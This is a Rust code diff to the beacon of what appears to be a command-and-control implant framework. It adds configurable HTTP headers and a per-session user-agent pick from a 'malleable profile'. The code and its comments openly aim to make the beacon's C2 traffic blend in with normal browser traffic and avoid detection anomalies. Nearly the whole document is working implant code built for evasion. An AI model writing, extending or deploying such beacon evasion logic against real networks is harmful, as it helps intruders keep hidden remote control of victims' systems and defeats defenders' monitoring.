@@ -248,6 +248,10 @@ struct HttpConn<S> {
     stream: S,
     host: String,
     user_agent: String,
+    /// Extra literal headers from the malleable profile (Accept-Language
+    /// and friends) sent on every POST — richer blending than the UA
+    /// alone, verbatim values.
+    extra_headers: Vec<(String, String)>,
     /// Precomputed `Cookie: <profile.cookie_name>=<token>` header sent
     /// on every POST (T035): a session cookie is what web-fronted
     /// traffic normally carries, a custom X-Session header is not. The
@@ -263,23 +267,23 @@ impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
         // drain into the local socket buffer while the response read never
         // completes. Bound every request/response exchange so the beacon
         // drops the connection and re-links (resuming its session) instead
-        // of going silent for the lifetime of the process.
-        let headers: &[(&str, &str)] = if hello {
-            &[(HDR_HANDSHAKE, "1"), ("Cookie", &self.cookie)]
-        } else {
-            &[("Cookie", &self.cookie)]
-        };
-        let exchange = async {
-            write_request(
-                &mut self.stream,
-                "POST",
-                uri,
-                &self.host,
-                &self.user_agent,
-                headers,
-                &body,
-            )
-            .await?;
+        // of going silent for the lifetime of the process. The header set
+        // is cloned into owned locals first: the write below borrows the
+        // stream mutably while the header values borrow immutably.
+        let cookie = self.cookie.clone();
+        let extra = self.extra_headers.clone();
+        let ua = self.user_agent.clone();
+        let host = self.host.clone();
+        let exchange = async move {
+            let mut headers: Vec<(&str, &str)> = Vec::with_capacity(2 + extra.len());
+            if hello {
+                headers.push((HDR_HANDSHAKE, "1"));
+            }
+            headers.push(("Cookie", cookie.as_str()));
+            for (name, value) in &extra {
+                headers.push((name.as_str(), value.as_str()));
+            }
+            write_request(&mut self.stream, "POST", uri, &host, &ua, &headers, &body).await?;
             let resp = read_response(&mut self.stream).await?;
             // 204 = empty poll from a 0.2.0+ teamserver: nothing sealed,
             // nothing to open; any other status is a transport error.
@@ -535,7 +539,11 @@ async fn run(
     let mut conn = HttpConn {
         stream: tls,
         host: host.to_string(),
-        user_agent: profile.user_agent.clone(),
+        // One stable pick per session from the profile's UA pool (browsers
+        // keep their UA for the session's lifetime; per-request rotation
+        // is its own anomaly).
+        user_agent: profile.pick_user_agent().to_string(),
+        extra_headers: profile.headers.clone(),
         cookie: format!("{}={}", profile.cookie_name, beacon.token),
     };
     // The session cookie identifies the C2 session; keep it under the
